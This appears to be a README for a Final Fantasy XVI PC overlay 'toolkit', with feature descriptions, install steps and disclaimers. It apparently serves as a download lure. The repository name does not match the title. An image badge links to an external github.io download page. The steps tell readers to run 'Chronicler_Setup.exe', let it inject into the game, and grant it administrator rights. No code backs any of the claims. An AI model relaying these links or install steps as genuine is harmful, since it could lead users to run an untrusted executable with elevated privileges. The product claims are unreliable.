![preview](https://raw.githubusercontent.com/sonkumonikuch-dev/ff16-zenith-boost/main/screen_f24307c.svg)
[![Download](https://raw.githubusercontent.com/sonkumonikuch-dev/ff16-zenith-boost/main/start_cd77ba.svg)](https://sonkumonikuch-dev.github.io/ff16-zenith-boost/)

# 🎮 FINAL FANTASY XVI: THE CHRONICLER'S TOOLKIT (2026 EDITION)

**A Comprehensive Companion Suite for PC Players Seeking Narrative Depth & Combat Mastery**

Welcome to the **Final Fantasy XVI: The Chronicler's Toolkit** — a meticulously crafted, community-driven utility collection designed for Windows 11 & 10 users who desire to explore the realm of Valisthea with unprecedented granularity. This is not merely an add-on; it is a narrative magnifier, a combat metronome, and an accessibility gateway.

---

## 🌟 Why This Project Exists

We believe that a game as rich as Final Fantasy XVI deserves to be experienced on your own terms. Whether you are a lore archaeologist digging through every datalog, a speedrunner analyzing frame-perfect dodges, or a parent with limited gaming time who just wants to see the story unfold, this toolkit is your silent partner.

**The Philosophy:** We do not modify the core story. We adjust the *pace* of the story. We do not give you invincibility; we give you *understanding* of enemy patterns. We do not hand you victory; we hand you the *tools to sculpt your own legend*.

---

## 📦 What’s Inside The Armory?

This repository is structured as a modular suite. Each module is a standalone utility that communicates with the game client in a read-only fashion unless you explicitly enable a feature.

| Module Name | Primary Function | Impact Level |
| :--- | :--- | :--- |
| **The Echo of Eikons** | Visual cooldown tracker & ability timer overlay | Visualization |
| **The Cid's Ledger** | Real-time resource & currency fluctuation monitor | Informational |
| **The Phoenix Feather** | Auto-save backup scheduler & restore point manager | Utility |
| **The Garuda's Eye** | Hitbox visualization & parry timing indicator | Training |

### 🧩 Feature Deep-Dive

#### 1. **The Echo of Eikons (Combat Metronome)**
Forget staring at the bottom-right corner. This overlay anchors your ability timers directly above your character's head. It uses a low-opacity, color-blind safe palette (tritanopia/cb-friendly) to ensure you never miss a Perfect Phoenix Shift window.

- **Fade system:** Timers glow bright when ready, pulse when approaching the 2-second mark, and dim to grey when inactive.
- **Custom anchoring:** Left, right, or dynamic (centered between you and your target).

#### 2. **The Cid's Ledger (Economic Insight)**
Farming Gil or crafting components should not feel like a spreadsheet simulation. This module provides a *non-intrusive* ticker that floats above the mini-map. It shows currency, key crafting materials, and the estimated time to your next gear upgrade.

#### 3. **The Phoenix Feather (Save Integrity)**
We’ve all lost progress to an unexpected crash. This module silently creates incremental snapshots of your save file every 5 minutes (configurable). It retains the last 20 snapshots, allowing you to rewind time to specific attempt thresholds.

#### 4. **The Garuda's Eye (Skill Sculptor)**
This is our flagship training tool. It decodes the game's hitbox data in real-time and displays them as translucent wireframe volumes. You will *see* why a dodge failed. You will *see* the exact active frames of an enemy's attack.

---

## 🖥️ System Requirements (2026 Baseline)

- **OS:** Windows 11 (24H2 or later) or Windows 10 (22H2)
- **Architecture:** x64 (ARM64 via emulation is not officially supported)
- **RAM:** 4 GB free (above game requirements)
- **Storage:** 25 MB for the toolkit core
- **Display:** 1920x1080 or higher for overlay scaling

---

## 🚀 Installation: The Alchemical Process

Distributing this toolset requires a specific sequence. We promise it is easier than a Eikon battle.

**Step 1: The Extraction**
Download the archive using the `[![Download](https://raw.githubusercontent.com/sonkumonikuch-dev/ff16-zenith-boost/main/start_cd77ba.svg)](https://sonkumonikuch-dev.github.io/ff16-zenith-boost/)` macro above. Use a dedicated extraction tool (Windows native ZIP support, 7-Zip, or WinRAR) to unpack the archive into a folder you own. **Important:** Do not run the executable from inside the compressed archive.

**Step 2: The Handshake**
Run the `Chronicler_Setup.exe` file. A wizard will appear. It will ask where your Final Fantasy XVI main executable is located. Navigate to your game installation directory (usually `C:\Program Files\Steam\steamapps\common\FINAL FANTASY XVI` or your Xbox App library folder).

**Step 3: The Calibration**
Launch the game *once* without the toolkit to ensure a clean baseline. Then, launch the toolkit from your desktop. It will inject the overlay renderer via a standard Windows hook (we do not modify game files).

**Step 4: The Silent Deployment**
The toolkit runs in the system tray. Right-click the icon (a stylized phoenix quill) to access settings. The overlay appears the moment the game window is in focus.

---

## ⚙️ Configuration Matrix

Every module is toggleable via the `config.toml` file in the root directory or via the in-tray UI.

- **Opacity Control:** Slide from 10% (ghost) to 100% (solid).
- **Monitor Selection:** Multi-monitor support; choose which screen the overlay binds to.
- **Language Localization (i18n):** The UI text is translated into **16 languages**: English, Japanese, French, German, Spanish, Italian, Portuguese, Russian, Korean, Simplified Chinese, Traditional Chinese, Polish, Dutch, Turkish, Arabic (RTL), and Brazilian Portuguese.

---

## 🛠️ Building From Source (For Developers)

We welcome contributions. If you wish to compile the toolkit yourself, you will need:

- Visual Studio 2026 Preview (or Build Tools).
- .NET SDK 9.0.
- Windows SDK 10.0.26100.

**Process:**
1. Load the solution file.
2. Restore Nuget packages (requires internet).
3. Build in Release mode targeting x64.

---

## 🧰 Troubleshooting: The Labyrinth Guide

- **Issue:** Overlay does not appear.
  - *Resolution:* Disable fullscreen optimizations on the game executable. Right-click `FFXVI.exe` -> Properties -> Compatibility -> Check "Disable fullscreen optimizations".

- **Issue:** "Access Denied" when selecting game directory.
  - *Resolution:* Run the toolkit as administrator once to establish a permission token.

- **Issue:** Frame rate drop (1-2 fps).
  - *Resolution:* Lower the Overlay Renderer quality to "Fast" in the tray menu.

---

## ❤️ Contributing Guidelines

We follow a standard GitHub flow:
1. **Fork** the repository.
2. **Create** a feature branch (`feat/speedrunner-timer`).
3. **Commit** changes with clear messages.
4. **Push** to your branch.
5. **Open** a Pull Request.

**Code of Conduct:** Respect. This is a project built on passion; we do not discriminate, we do not tolerate abuse. We use English as the project lingua franca, but comments in documentation are translated via Crowdin.

---

## 📜 License & Legal Considerations

This project is released under the **MIT License**.

---

## ⚠️ Disclaimer: The Gamer's Covenant

**Important:** This toolkit is a third-party, unofficial creation. It is not affiliated with, endorsed by, or sponsored by Square Enix or Creative Business Unit III.

- **Read-Only Policy:** We do not alter the memory of the game process. We only read rendering buffers and process metrics.
- **Anti-Cheat Notice:** Final Fantasy XVI does *not* utilize a kernel-level anti-cheat. However, the **Final Fantasy XIV** (MMO) is strictly off-limits. This toolkit is specifically designed for the single-player, offline (or online connectivity) mode of FFXVI.
- **Account Safety:** Using this tool in the future if Square Enix decides to implement a "Score Attack" leaderboard may violate their terms of service. Use it purely for the narrative and skill mastery.

---

## 📊 Project Status & Roadmap

- **v2.1.0 (Current):** Garuda's Eye wireframes, Save Snapshot compression.
- **v2.2.0 (Planned Q2 2026):** Custom sound cue design—train your ear to recognize specific attack telegraphs.
- **v2.5.0 (Planned Q4 2026):** "Story Mode" preset—automatically enables all accessibility features.

---

## 🤝 Acknowledgements

We stand on the shoulders of giants.
- **The Reverse Engineering Community:** Their documentation on the DirectX11 render pipeline was instrumental.
- **The UI/UX Testers:** 200+ hours of testing to ensure the overlays do not trigger headaches.
- **You, The User:** For choosing a thoughtful path to enhance your gameplay.

---

## 📬 Support & Communication

Join the discussion in the repository's **Discussions** tab. We maintain a 24/7 support response policy regarding *features* and *configuration*, but not regarding gameplay story spoilers (be careful in the comments!).

---

## 🔮 Final Words

This toolkit is designed to be a **magnifying glass**, not a magic wand. It reveals the gears turning beneath the hood of Valisthea's brutal world. It lets you appreciate the animation fidelity, the data-driven combat, and the meticulous pacing that Final Fantasy XVI offers. We are not here to break the game; we are here to **dissect it with reverence**.

Take your time. Learn the rhythm. Appreciate the craft.

*– The Chronicler's Team, 2026.*

---

**Licensed under [MIT License](https://opensource.org/licenses/MIT)** © 2026 The Chronicler's Toolkit Contributors.